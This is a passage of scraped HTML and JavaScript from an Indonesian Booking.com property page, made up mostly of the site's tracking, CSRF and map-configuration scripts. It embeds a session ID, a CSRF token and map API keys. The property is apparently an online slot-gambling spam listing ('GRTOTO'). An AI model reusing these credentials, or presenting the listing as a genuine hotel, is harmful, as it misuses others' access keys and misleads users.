<tr><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td class="wk_ar">&nbsp;</td><td class="wk wk_ar">&nbsp;</td><td class="wk">&nbsp;</td></tr>
<tr><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td class="wk_ar">&nbsp;</td><td class="wk wk_ar">&nbsp;</td><td class="wk">&nbsp;</td></tr>
<tr><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td class="wk_ar">&nbsp;</td><td class="wk wk_ar">&nbsp;</td><td class="wk">&nbsp;</td></tr>
<tr><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td><td class="wk_ar">&nbsp;</td><td class="wk wk_ar">&nbsp;</td><td class="wk">&nbsp;</td></tr>
</tbody>
</table>
<span class="calendar_close">Tutup kalender</span>
</div>
<script nonce="cH3DZKVyvb8x5Uh"> if( window.performance && performance.measure && 'b-pre-scripts') { performance.measure('b-pre-scripts'); } </script> 
<script id="script-booking-availability-rooms-env" type="text/javascript" nonce="cH3DZKVyvb8x5Uh">
// <![CDATA[
booking.env.you_can_book_at_most_x_rooms_with_this_hotel = 'Anda bisa memesan paling banyak  0 kamar dengan hotel ini';
booking.env.you_can_book_for_at_most_x_guests_per_reservation_with_this_hotel = 'Anda bisa memesan untuk paling banyak  pengunjung setiap kali memesan dengan hotel ini.';
// ]]>
</script>
<script nonce="cH3DZKVyvb8x5Uh">
var B = booking = window.booking || {};
var booking_extra = {
pageview_id: 'a8c81d0eb7550190',
b_aid: '356980',
b_stid: '356980',
b_lang_for_url: 'id',
b_gtt: "dLYAeZFVJfNTBBSSUZWFKccOIfVNALSbEQBSSUC",
b_ch: 'd',
b_site_type_id: '1',
b_action: 'hotel'
};
</script>
<script
src="https://cf.bstatic.com/static/js/error_catcher_bec_cloudfront_sd/c40c55637440286271899bb4294fd743b387ac07.js"
crossorigin
nonce="cH3DZKVyvb8x5Uh"
></script>
<script nonce="cH3DZKVyvb8x5Uh">
if ('serviceWorker' in navigator && navigator.serviceWorker.getRegistrations) {
navigator.serviceWorker.getRegistrations().then(function(registrations) {
registrations.forEach(function(registration) {
registration.unregister();
});
});
}
</script>
<script nonce="cH3DZKVyvb8x5Uh">
(function(){
(function(){
var et=function(){"use strict";var s,c={level:0},f={experiment:"e",stage:"s",goal:"g",customGoal:"cg",goalWithValue:"gwv"},r=[],o=function(){var n,r={},o="";function t(){var e,t=o;o=Object.keys(r).join(","),(n||(n=document.getElementById("req_info")))&&(n.innerHTML!==t&&(e=n.innerHTML,r=e.split(",").reduce(function(e,t){return e[t]=!0,e},r),o=Object.keys(r).join(",")),n.innerHTML=o)}function i(e){r[e]=!0}return{populate:function(e){i(e),"string"==typeof e?(i(e),t()):e instanceof Array&&(e.forEach(i),t())}}}(),i=function(){var r,o=!1,i=[],n=[],e=0;function a(){c.level&&c.report(c.events.BEACON_SENT,i),o=!1,e=0,r=null,i.length&&l()}function u(){o=!1,r=null,10<=++e?n=[]:(i=i.concat(n),n=[],r=window.setTimeout(l,100*e))}function l(){c.level&&c.report(c.events.SEND_BEACON,i.slice(0)),o=!0;var e=s+"&"+function(e){for(var t,n=[],r=[],o=[],i=[],a=[],u=0,l=e.length;u<l;++u)switch((t=e[u]).what){case f.experiment:n.push(t.hash);break;case f.stage:a.push(t.hash+"|"+t.id);break;case f.goal:r.push(t.hash);break;case f.customGoal:o.push(t.hash+"|"+t.id);break;case f.goalWithValue:var s=b(t.hash);s&&i.push(s);break;default:c.level&&c.report(c.events.UNABLE_TO_STRINGIFY,t)}return"ete="+n.join(",")+"&etg="+r.join(",")+"&etcg="+o.join(",")+"&ets="+a.join(",")+"&etgwv="+i.join(",")}(n=i);N.m&&(e+="&m="+encodeURIComponent(N.m)),i=[];try{!function(e){var t,n=e.url,r=e.complete||function(){},o=e.headers||{},i=XMLHttpRequest.DONE||4,a=new XMLHttpRequest;if(!n)return;if(a.open("GET",n,!0),o)for(t in o)o.hasOwnProperty(t)&&a.setRequestHeader(t,"function"==typeof o[t]?o[t].call():o[t]);a.onreadystatechange=function(){a.readyState===i&&r(a,a.status)},a.send()}({url:e,complete:function(e,t){200===t?a():u()},headers:w})}catch(e){var t=new Image;t.onload=a,t.onerror=u,t.src=s}}return function(e,t,n){c.level&&c.report(c.events.INIT_BEACON,e,t,n),i.push({what:e,hash:t,id:n}),o||r?c.level&&c.report(c.events.DEFER_BEACON,i):r=window.setTimeout(l,0)}}(),a={},h=300,u=!1,p={},v=[],g=!1,l=!1,d=!1,m=!1,w={},T=!1,E=!1,n=!1,N={r:{},t:{},f:{}};N.r||(N.r={}),N.f||(N.f={}),N.t||(N.t={});var _={},y=50;function b(e){if(_[e]&&_[e][0].length){var t=_[e][0],n=_[e][1],r=[e,t.join(":")];return n.length&&r.push(n.join(":")),[].push.apply(n,t.splice(0,t.length)),r.join("|")}}function A(e,t,n){return(e===f.experiment||e===f.goal?[e,t]:[e,t,n]).join("-")}function I(e){if(!d)return e;if(a[e])return a[e];for(var t=2166136261,n=0,r=e.length;n<r;++n)t+=(t<<1)+(t<<4)+(t<<7)+(t<<8)+(t<<24),t^=e.charCodeAt(n);return a[e]=(t>>>0).toString(16)}function O(e,t,n){if(c.level&&c.report(c.events.TRACKING_ATTEMPT,{what:e,hash:t,id:n,variant:(e===f.experiment||e===f.stage)&&W(t)}),R(e,t,n))switch(e){case f.experiment:C(f.experiment,t),o.populate(t),N.m&&r.push(t),i(f.experiment,t);break;case f.stage:C(f.stage,t,n),o.populate(t+"|"+n),N.m&&r.push(t+"|"+n),i(f.stage,t,n);break;case f.goal:C(f.goal,t),i(f.goal,t);break;case f.customGoal:C(f.customGoal,t,n),i(f.customGoal,t,n);break;case f.goalWithValue:(function(e,t){_[e]||(_[e]=[[],[]]);var n=_[e][0];if(_[e][1].length<=y+10)return n.push(t),!0})(t,n)&&i(f.goalWithValue,t,n);break;default:c.level&&c.report(c.events.TRACK_UNKNOWN_ITEM,e,t,n)}return e!==f.experiment||W(t)}function C(e,t,n){p[A(e,t,n)]=!0}function R(e,t,n){if(m)return!1;c.level&&c.report(c.events.SHOULD_TRACK,e,t,n);var r,o,i={what:e,hash:t,id:n,variant:(e===f.experiment||e===f.stage)&&W(t)};if(p[A(e,t,n)])return c.level&&c.report(c.events.NOT_TRACKING_WAS_TRACKED,i),!1;if(e===f.experiment||e===f.stage){if(o=1<<(n||0),r=I(t),N.f[r])return c.level&&c.report(c.events.NOT_TRACKING_FULLON,i),!1;if(void 0===N.r[r])return c.level&&c.report(c.events.NOT_TRACKING_NOT_RUNNING,i),!1;if(N.t[r]&o)return C(e,t,n),c.level&&c.report(c.events.NOT_TRACKING_WAS_TRACKED,i),!1}else if(e===f.customGoal){if(r=I(t),N.f[r])return c.level&&c.report(c.events.NOT_TRACKING_FULLON,i),!1;if(void 0===N.r[r])return c.level&&c.report(c.events.NOT_TRACKING_NOT_RUNNING,i),!1}return!0}function G(n,e,r,o,i){c.level&&c.report(c.events.ADD_EVENT_LISTENER,n,e,r,o,i);var a=function(e){{if("string"==typeof e)return M(document.querySelectorAll(e));if(e instanceof HTMLCollection)return M(e);if(e instanceof NodeList)return M(e);if(e instanceof Element)return[e];if("[object Array]"===Object.prototype.toString.call(e))return e;if(window.jQuery&&e instanceof jQuery)return e.toArray()}return[]}(e);if(0<a.length)if("view"===n)!function(e,t,n,r){c.level&&c.report(c.events.ADD_DEBOUNCED_VIEW_HANDLER,e,t,n,r);var o=A(t,n,r);if(p[o])return;v.push([e,t,n,r]),g||(c.level&&c.report(c.events.ATTACH_VIEW_LISTENER,v),L(window,"scroll",k),L(window,"resize",k),L(window,"wheel",k),L(window,"load",j),window.setTimeout(k,h),T&&T(k),g=!0)}(a[0],r,o,i);else for(var t=0,u=a.length;t<u;t++)L(a[t],n,l);else c.level&&c.report(c.events.NOT_EXISTING_ELEMENT_WONT_ADD_LISTENER,r,o,i);function l(){O(r,o,i);for(var e=0,t=a.length;e<t;e++)V(a[e],n,l)}}function j(){window.setTimeout(k,h)}function k(){if(l){if(u)return;u=setTimeout(function(){u=!1,k()},h)}l=!0;var e,t=[];c.level&&c.report(c.events.CHECK_IF_VISIBLE,v);for(var n=0,r=v.length;n<r;++n)(e=v[n])&&S(e[0])?(c.level&&c.report(c.events.ONVIEW_TRACKING_TRIGGERED,e[1],e[2],e[3]),O(e[1],e[2],e[3])):t.push(e);v=t,c.level&&c.report(c.events.VISIBLE_CHECK_FINISHED,v),0===v.length&&(g=!1,V(window,"scroll",k),V(window,"resize",k),V(window,"load",j),E&&E(k),c.level&&c.report(c.events.DETACH_VIEW_LISTENER)),window.setTimeout(function(){l=!1},h)}function S(e){var t,n,r;return!!e&&(!!e.parentElement&&(!e.getBoundingClientRect||(t=e.getBoundingClientRect(),n=window.innerHeight||document.documentElement.clientHeight,r=window.innerWidth||document.documentElement.clientWidth,!(t.right<0||t.left>r||0===t.top&&0===t.left&&0===t.right&&0===t.bottom)&&t.top<n)))}function L(e,t,n){e.attachEvent?(e["e"+t+n]=n,e[t+n]=function(){e["e"+t+n](window.event)},e.attachEvent("on"+t,e[t+n])):e.addEventListener(t,n,!1)}function V(e,t,n){e.detachEvent?e[t+n]&&(e.detachEvent("on"+t,e[t+n]),e[t+n]=null):e.removeEventListener(t,n,!1)}function B(n,r,o){return function(e,t){R(o,e,t)?G(n,r,o,e,t):c.level&&c.report(c.events.WONT_ATTACH_EVENT_TRACKING,n,r,o,e,t)}}function D(e,t){return{track:B(e,t,f.experiment),stage:B(e,t,f.stage),goal:B(e,t,f.goal),customGoal:B(e,t,f.customGoal)}}function t(e,t){for(var n in t)t.hasOwnProperty(n)&&(e[n]=t[n])}function H(e){N.f=e.f||{},t(N.r,e.r||{}),t(N.t,e.t||{}),e.m&&!N.m&&(N.m=e.m,r=[])}function W(e){var t=I(e);return N.r[t]||N.f[t]||0}function K(e){if(1<arguments.length)throw"Track only accept one parameter";if(e)return O(f.experiment,e);if(n)throw"B.et.track: hash value should be a non-empty string";return 0}function x(e){var t,n=/^(?:(goal|customGoal):)?([a-zA-Z]\w+)?(?::([\d]))?$/,r=[];for(e=e.split(/\s+/),t=0;t<e.length;t++){var o=e[t].match(n),i=o&&o[2],a=o&&o[3],u=o&&o[1]||(a?"stage":"track");u&&r.push({hash:i,value:a,action:u})}return r}function M(e){var t,n=[],r=e.length;for(t=0;t<r;t++)n.push(e[t]);return n}function e(){}return e.prototype.track=K,e.prototype.stage=function(e,t){if(!e){if(n)throw"B.et.trackStage: hash value should be a non-empty string";return!1}if(void 0===t){if(n)throw"B.et.trackStage: stage number should be a number between 1 and 9";return!1}if(0===t)return K(e);if(/^[1-9]$/.test(t))return O(f.stage,e,t);if(n)throw"B.et.trackStage: stage number should be a number between 1 and 9";return!1},e.prototype.goal=function(e){if(e)return O(f.goal,e);if(n)throw"B.et.goal: name should be a non-empty string";return!1},e.prototype.customGoal=function(e,t){if(e&&t&&/^[1-5]$/.test(t))return O(f.customGoal,e,t);if(n){if(!e)throw"B.et.customGoal: hash value should be a non-empty string";if(!t||!/^[1-5]$/.test(t))throw"B.et.customGoal: custom goal number should be a number between 1 and 5"}return!1},e.prototype.goalWithValue=function(e,t){if(/^js_/.test(e)&&/^-?[0-9]+$/.test(t))return O(f.goalWithValue,e,t);if(n){if(!/^js_/.test(e))throw"B.et.goalWithValue: name should be a non-empty string with prefix js_";if(!/^-?[0-9]+$/.test(t))throw"B.et.goalWithValue: value should be an integer"}return!1},e.prototype.on=D,e.prototype.set=H,e.prototype.Trackables=f,e.prototype.configure=function(e){e.url&&(s=e.url),e.jset&&H(e.jset),void 0!==e.useFNV&&(d=e.useFNV),void 0!==e.ajaxHeaders&&(w=e.ajaxHeaders),void 0!==e.snt&&(m=e.snt),"function"==typeof e.bindOnView&&(T=e.bindOnView),"function"==typeof e.unbindOnView&&(E=e.unbindOnView),e.isDevServer&&(n=!0)},e.prototype.initAttributesTracking=function(i){var a,u,l,s=["change","click","mouseenter","focus","view"];!function(){if(i&&0!==i.length?i.length&&(i=i[0]):i=document,i&&i.querySelectorAll)for(a=0;a<s.length;a++){l="data-et-"+(u=s[a]);for(var e=i.querySelectorAll("["+l+"]"),t=0;t<e.length;t++){var n=e[t],r=x(n.getAttribute(l)),o=D(u,n);r.forEach(function(e){o&&o[e.action]&&o[e.action](e.hash,e.value)})}}}()},e.prototype.tracked=function(){return r.join(",")},e.prototype.registerDebug=function(e){if(0==c.level){var t=!isNaN(e.level),n="object"==typeof e.events,r="function"==typeof e.report;t&&n&&r&&(c.level=e.level,c.events=e.events,c.report=e.report)}},new e}();
B.et = et;
}());
var ViewTrackingEvents = (function() {
var desktopEvents = [
'GENERAL:dom_changed',
'GENERAL:layout_changed',
'GENERAL:throttled_scroll',
'GENERAL:throttled_resize',
'tab-opened',
'user_access_menu_register_tab',
'user_access_menu_login_tab',
'uc_popover_showed',
'rt-lightbox-open',
'rt-lightbox-closed',
'tooltip:show',
'reviews-sliding:scroll',
'et-scroll-observer:scroll'
];
var mdotEvents = [
'HP.MAP.OPEN.COMPLETE',
'HP.block.expand',
'tabbed_nav:opened',
'RT.room.page.scrolls',
'RT.room.expand',
// START xroom_m_searchbox_rooms_before_guests
'hp_dates_popup_show',
// END xroom_m_searchbox_rooms_before_guests
'RT.room.select.done',
'k2.sub.page.opened',
'k2.sub.page.scrolls',
'k2.drawerWithNavigation.scrolls'
];
return [].concat(desktopEvents, mdotEvents);
}());
var ajaxHeaders = {
'X-Booking-AID': '356980',
'X-Booking-CSRF': 'XJvXaAAAAAA=CX4s0D3iyg_iRUuMf2iAsA1zXpCWWiDymbBvzH2ABQjTszO3mfTCYHHUwSJCfLs6ukyO3JHkVWlP_MW02hTuSsNl1-Ru8GTcV_Y4CC0qmOXJl6Fdl-0tPC8r8z6HBK1fIFuAnDquEPeMiNr2jwIC4paXij0E9cBqLmEYbe9YAN1ZjwZtIOctNDR7sMeXwVN0I6spkMtq322zhFeC',
'X-Booking-Info': function(){ return (document && document.getElementById('req_info')) ? document.getElementById('req_info').innerHTML : '' },
'X-Booking-Client-Info': function() { return B.et.tracked() },
'X-Booking-Label': encodeURIComponent('gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ'),
'X-Booking-Language-Code': 'id',
'X-Booking-Pageview-Id': 'a8c81d0eb7550190',
'X-Booking-Session-Id': '7ddc46c9c1086cdb3bc11bc91f12833b',
'X-Booking-SiteType-Id': '1',
'X-Partner-Channel-Id': '17',
'X-Requested-With': 'XMLHttpRequest'
};
var extraAjaxHeaders = {};
for (var extraAjaxHeader in extraAjaxHeaders) {
if (Object.prototype.hasOwnProperty.call(extraAjaxHeaders, extraAjaxHeader)) {
ajaxHeaders[extraAjaxHeader] = extraAjaxHeaders[extraAjaxHeader];
}
}
var eventsBindedAlready = false;
function bindViewTrackingEvents(onViewHandler) {
if (B.eventEmitter && !eventsBindedAlready) {
for (var i = 0; i < ViewTrackingEvents.length; i++) {
B.eventEmitter.bind(ViewTrackingEvents[i], onViewHandler);
}
window.addEventListener('wheel', onViewHandler)
eventsBindedAlready = true;
}
}
B.et.configure({
url: "/js_tracking?ref_action=hotel&stype=1&ver=2&aid=356980&pid=a8c81d0eb7550190&sid=7ddc46c9c1086cdb3bc11bc91f12833b&lang=id",
noJqueryAjax: true,
noJqueryOn: true,
ajaxHeaders: ajaxHeaders,
bindOnView: function(onViewHandler) {
bindViewTrackingEvents(onViewHandler);
if(document.addEventListener) {
document.addEventListener('DOMContentLoaded', function() {
bindViewTrackingEvents(onViewHandler);
});
}
},
unbindOnView: function(onViewHandler) {
if (B.eventEmitter) {
for (var i = 0; i < ViewTrackingEvents.length; i++) {
B.eventEmitter.unbind(ViewTrackingEvents[i], onViewHandler);
}
window.removeEventListener('wheel', onViewHandler)
}
},
jset: B.jset || { r: {}, t: {}, f: {}}
});
window.setTimeout(function() {
B.et.initAttributesTracking();
}, 4);
}());
</script>
<script nonce="cH3DZKVyvb8x5Uh">(function() { function fireJqueryLoadError() { if(!document.getElementById('req_info')){ setTimeout(fireJqueryLoadError, 100); return; } window.onerror('3rd_JQUERY: load error - ' + 'https://cf.bstatic.com/static/js/jquery_cloudfront_sd/e1e8c0e862309cb4caf3c0d5fbea48bfb8eaad42.js', 1, 1); }; document.addEventListener('error', function(e) { if (e.target && e.target.classList.contains('jquery-script-tag')) { fireJqueryLoadError(); } }, true); })(); </script>
<script src="https://cf.bstatic.com/static/js/jquery_cloudfront_sd/e1e8c0e862309cb4caf3c0d5fbea48bfb8eaad42.js" class="jquery-script-tag" crossorigin nonce="cH3DZKVyvb8x5Uh"></script>
<script nonce="cH3DZKVyvb8x5Uh"> if ( this.$ && $.fn && $.fn.bind ) { $( this.document.body ).bind( 'submit', function( evt ) { var win = Function( 'return this' )(), token = 'XJvXaAAAAAA=CX4s0D3iyg_iRUuMf2iAsA1zXpCWWiDymbBvzH2ABQjTszO3mfTCYHHUwSJCfLs6ukyO3JHkVWlP_MW02hTuSsNl1-Ru8GTcV_Y4CC0qmOXJl6Fdl-0tPC8r8z6HBK1fIFuAnDquEPeMiNr2jwIC4paXij0E9cBqLmEYbe9YAN1ZjwZtIOctNDR7sMeXwVN0I6spkMtq322zhFeC', input = win.document.createElement( 'input' ), check = win.document.createElement( 'input' ), form = $( evt.target ); if ( ! form.find( '[name="bhc_csrf_token"]' ).length && ( form.attr( 'method' ) || '' ).toLowerCase() === 'post' ) { input.type = 'hidden'; input.value = token; input.name = 'bhc_csrf_token'; check.type = 'hidden'; check.value = 1; check.name = 'bhc_csrf_token_check'; form.append( input ).append( check ); } }); } (function(){ if (window.self !== window.top) { $.ajax({ type: 'POST', url: 'https://www.booking.com/_frdtcr?aid=356980', data: { 'pid': 'a8c81d0eb7550190', 'ref': document.referrer, 'url': document.location.href } }); } }()); </script> 
<script src="https://cf.bstatic.com/static/js/core-deps-inlinedet_cloudfront_sd/f62025e692b596dd53ecd1bd082dfd3197944c50.js" crossorigin nonce="cH3DZKVyvb8x5Uh"></script>
 <script nonce="cH3DZKVyvb8x5Uh">
;(function(){
var envData = B.require('tmpl_data');
if (!envData) return;
envData({"b_lang_for_url":"id","pageview_id":"a8c81d0eb7550190","b_action":"hotel","b_aid":356980,"b_sid":"7ddc46c9c1086cdb3bc11bc91f12833b","b_site_type_id":1});
}());
</script>
<script nonce="cH3DZKVyvb8x5Uh">
if (B.env) {
B.env.search_box_keep_children_ages_order = true;
}
B.require('tmpl_data')({"b_search_config":{"b_adults_total":2,"b_pets_total":null,"b_abnormal_params":0,"b_nr_rooms_needed":1,"traveller_segment":"couple","b_children_ages_total":[],"autosplit":1,"b_rooms":[{"b_adults":2,"b_children_ages":[],"b_children":0,"b_room_order":1}],"b_children_total":0,"b_is_group_search":0}});
</script>
</script>
<script src="https://cf.bstatic.com/static/js/main_cloudfront_sd/7d3fe39bc2dfe5fb6e218d630fc87193c54b6148.js" crossorigin nonce="cH3DZKVyvb8x5Uh"></script>
<script nonce="cH3DZKVyvb8x5Uh">
window.onload = function () {
var elements = document.querySelectorAll('[data-defer-prefetch]');
Array.prototype.forEach.call(elements, function(el){
el.setAttribute('rel', 'prefetch');
});
};
</script>
<link rel="_prefetch" data-defer-prefetch href="https://cf.bstatic.com/static/js/searchresults_cloudfront_sd/4a4b583bfb88796131dbd84d1c8fbc038dc47543.js" nonce="cH3DZKVyvb8x5Uh">
<link rel="_prefetch" data-defer-prefetch href="https://cf.bstatic.com/static/js/searchresults_slick_cloudfront_sd/528359eb9f21194adf8c26f81e07c6eb21a2cc89.js" nonce="cH3DZKVyvb8x5Uh">
<link rel="_prefetch" data-defer-prefetch href="https://cf.bstatic.com/static/js/book_cloudfront_sd/c74fac1aff20e08aa3aa9bf493a9a3da74c7c535.js" nonce="cH3DZKVyvb8x5Uh">
<script crossorigin type="text/javascript" src="https://cf.bstatic.com/static/js/genius_vip_cloudfront_sd/aae975495cc56436f4f59463b9ea4e594bdb102a.js" nonce="cH3DZKVyvb8x5Uh"></script>
<script crossorigin type="text/javascript" src="https://cf.bstatic.com/static/js/sp-on-maps_cloudfront_sd/04f61ab808c709eae82ca98f22b27d6633817fbd.js" nonce="cH3DZKVyvb8x5Uh"></script>
<script nonce="cH3DZKVyvb8x5Uh">
booking.env.b_query_params_with_lang = '.id.html?aid=356980&label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&sid=7ddc46c9c1086cdb3bc11bc91f12833b';
booking.env.b_ufi = '-2699554';
booking.env.b_has_valid_dates_not_in_past = '';
booking.env.b_dest_type = '';
</script>
<script nonce="cH3DZKVyvb8x5Uh">
B.env.is_rooms_table_splitter = true;
</script>
<script nonce="cH3DZKVyvb8x5Uh">
B.env.b_is_new = '';
B.env.b_referer_action = '';
B.env.is_rooms_table_rewrite = true;
</script>
<script src="https://cf.bstatic.com/static/js/hotel_cloudfront_sd/416f72c49d5bd49c421a1ac400af960942122346.js" crossorigin nonce="cH3DZKVyvb8x5Uh"></script>
<script src="https://cf.bstatic.com/static/js/tpi_roomblock_cst_cloudfront_sd/d3da3e568815a19e8e9719bf19278ac4bcc64471.js" crossorigin nonce="cH3DZKVyvb8x5Uh"></script>
<script src="https://cf.bstatic.com/static/js/hotel_experiments_rtrw_cloudfront_sd/11648e40bde3c51d7e9e18d5f976ef5e80e90fb0.js" crossorigin nonce="cH3DZKVyvb8x5Uh"></script>
<script crossorigin type="text/javascript" src="https://cf.bstatic.com/static/js/plugable-access-form_cloudfront_sd/24b54ab3fd7377cb8b4a614b18f0e894bbfb5b41.js" nonce="cH3DZKVyvb8x5Uh"></script>
<script src="https://cf.bstatic.com/static/js/searchbox_cloudfront_sd/b3c5d3f7069cc96a4a9015a241a291577359e7af.js" crossorigin nonce="cH3DZKVyvb8x5Uh"></script>
<script nonce="cH3DZKVyvb8x5Uh">
booking.ensureNamespaceExists('env');
booking.env.b_map_center_latitude = 3.54616490;
booking.env.b_map_center_longitude = 98.76312720;
booking.env.b_hotel_id = '14770538';
booking.env.b_query_params_no_ext = '?aid=356980&label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&sid=7ddc46c9c1086cdb3bc11bc91f12833b';
booking.env.b_server_role='app';
</script>
<script nonce="cH3DZKVyvb8x5Uh">
;(function (){
var maps = booking.maps || booking.atlas;
if (!maps) {
return;
}
/**/ ;(function () { 'use strict'; if (!B.atlas || !B.atlas.define) { return; } B.atlas.define('util-env', function () { var env = { /* jshint ignore:start *//*
*/ markersOnMapURL: '/markers_on_map?aid=356980&label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&sid=7ddc46c9c1086cdb3bc11bc91f12833b;aid=356980;dest_id=14770538;dest_type=hotel;sr_id=;ref=hotel;limit=50;stype=1;lang=id;ssm=1;ngp=1;room1=A,A;maps_opened=1;sr_countrycode=id;sr_lat=;sr_long=;dbc=1;sod=1 ;sfd=1 ;scc=1 ;somp=1 ;hr=3 ;shp=1;srh=;mdimb=1 ;tp=1 ;img_size=270x200 ;avl=1 ;nor=1 ;spc=1 ;rmd=1 ;slpnd=1 ;sbr=1', markerDetailsURL: '/hotels_onmap_detail?aid=356980&amp;label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&amp;sid=7ddc46c9c1086cdb3bc11bc91f12833b;lang=id;act=d-hotel;detail=0;currency=IDR;av=1;c=1;stype=1;cc1=id;aid=356980;dest_id=;dest_type=;img_size=90;localize_format=1;gfa=1 ;rr=1 ;rp=1;fav_hot_mins=1;g=0;room1=A,A;stl=1;fcob=1;v=1;rpr=1;st=1;blsd=1;bpl=1;deals=1;pt=1;nvrs=1;srocc=1', googleMapsUrl: 'https://maps.googleapis.com/maps/api/js?callback=GLOBAL_ATLAS_GOOGLE_MAPS_CALLBACK&channel=booking_accommodations_desktop&language=id&region=id&v=3.47&libraries=places&key=AIzaSyAsgWlbQ7IVo47Y8MrywoT_WdtVtH7UPCA', baiduMapsUrl: 'https://api.map.baidu.com/api?v=1.0&ak=zB7EXCv9oKE9esSfDp4V7UfZjyZU6DHL&type=webgl&callback=GLOBAL_ATLAS_BAIDU_MAPS_CALLBACK', yandexMapsUrl: '', destinationType: 'hotel', destinationId: '14770538', destinationTypeSr: '', destinationIdSr: '', destinationAtlasId: 'hotel_14770538', destinationName: 'Yogyakarta', isPlaceIdUsed: '' === '1', checkinCheckoutInterval: '', checkinCheckoutIntervalInWeeks: '', killSwitch: !!'', mapTrackKillSwitch: !!'', googleBoundingBox: '', isWithUpcomingBooking: '0', isVacationRental: '', copyFdSoldOut: '', copyMapOccupancyDisclaimer1: '', leafletURL: 'https://cf.bstatic.com/static/js/atlas-leaflet_1_2_0_cloudfront_sd/f0106108a6f86fffdab2ee29f3ef1e613646d6ac.js', mapboxGlURL: 'https://cf.bstatic.com/static/js/atlas-mapbox_cloudfront_sd/f9a1942f34949ba26453b97c11c67d8987216b2d.js', mapboxURL: 'https://api.mapbox.com/mapbox.js/v3.1.1/mapbox.js', mapboxAccessToken: 'pk.eyJ1IjoibWFwYm94LWJvb2tpbmciLCJhIjoiY2o2eDR6cTJjMXBhbTJxbHBjbHFoYjM1cSJ9.5ILI4me1N2YZOdzDbl4gRw', tilesProjection: '', tilesLabelroadmap: '', tilesURLroadmap: '', tilesCopyrightroadmap: '', tilesMaxZoomroadmap: 18, tilesMinZoomroadmap: 2, tilesLabelsatellite: '', tilesURLsatellite: '', tilesURLOverlaysatellite: '', tilesCopyrightsatellite: '', tilesMaxZoomsatellite: 18, tilesMinZoomsatellite: 2, ufi: '-2699554', b_dest_id: '', aid: '356980', defaultBoundingBox: '', defaultCoordinates: ['3.54616490', '98.76312720'], isRTL: '', isLP: !!'', action: 'hotel', tdot: '0' === '1', ddot: '0' !== '1', hasValidDates: '' === '1', isPartner413084: !!'', isVillaSite: !!'', bookingWindow: '', isCustomZoom: '', returningStatus: '1', isLandOrAddrMarkerEnabled: '', districtId: '', enableDistrictPolyFromSRLink: '', isGeniusUser: '', isDomesticBooker: '1' === '1', pricePerXNightsTxt: '', providerName: 'google', isNotIE9AndBelow: '1', isNotIE11AndBelow: '1', isProviderMapBox: '', isProviderBaidu: '', isMapSrAjax: '', map_copy_fd_sold_out: 'Terjual habis di tanggal pilihan Anda', map_occupancy_disclaimer_1: 'Maaf, penginapan ini tidak dapat mengakomodasi jumlah rombongan Anda', totalHotels: '', availableHotels: '', paramNflt: '', urlParamNflt: '', srPageviewId: 'a8c81d0eb7550190', nights: '', lang: 'id', currency: 'IDR', bbtoolPromoPageURL: 'https://www.booking.com/business.id.html?aid=356980&label=gog235jc-10CAsoaEI2dHVwYWl3aW4tcmVrb21lbmRhc2ktdG90by1zbG90LXRlcnBlcmNheWEtbWluLWRlcG8tMTBrSAlYA2hoiAEBmAEzuAEXyAEM2AED6AEB-AEBiAIBqAIBuALNvt3GBsACAdICJDczM2Y4YTUyLTgzY2YtNGYzYS04NjJmLWQxY2ZiMDEzMmI1ZtgCAeACAQ&sid=7ddc46c9c1086cdb3bc11bc91f12833b&stid=1145583', adultsTotal: '2', childrenTotal: '0', nrRooms: '1', nrProperties: '', isGroupSearch: '0', checkinDay : '', checkinMonthShort : '', checkoutDay : '', checkoutMonthShort : '', bookWindow: '', checkinDate: '', checkoutDate: '', hasMapFavicon: '1', inCityName: 'di Yogyakarta', cityName: 'Yogyakarta', airportLatitude: '', airportLongitude: '', landmarkLatitude: '', landmarkLongitude: '', addressLatitude: '', addressLongitude: '', b_review_score_detailed: '', fe_sp_load_maps_component: '1',destinationFullName: 'Yogyakarta',bbtoolMap: '', travelPurpose: '2', bbtool_fv : '', isBusinessBooker : '', fe_bbtool_can_see_tool_promos: '1', b_guest_country: 'id', b_selected_language: 'id',b_countrycode: 'id', fe_china_estimated_rating: '', triggerAutoOpen: '' || /[;?&]+map=1/gi.test(location.search), disablePlaces: '',isSkiArea: '', b_is_in_beach_ufi: '0', fe_is_resort_heavy_ufi: '', b_hotel_name_en_with_translation: 'GRTOTO: Bandar Slot Online Hari ini Keamanan Pasti Terjamin', hotelBbox: 